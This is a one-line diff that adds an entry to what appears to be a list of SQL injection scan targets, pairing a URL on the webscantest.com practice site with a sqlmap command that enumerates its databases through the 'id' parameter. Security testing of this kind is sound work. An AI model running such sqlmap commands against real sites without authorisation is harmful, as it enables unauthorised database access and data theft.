@@ -1,0 +1,1 @@
+http://www.webscantest.com/datagrid/inc_datagrid.php?id=1 (GET)  # sqlmap.py -u http://www.webscantest.com/datagrid/inc_datagrid.php?id=1 --random-agent --batch --dbs
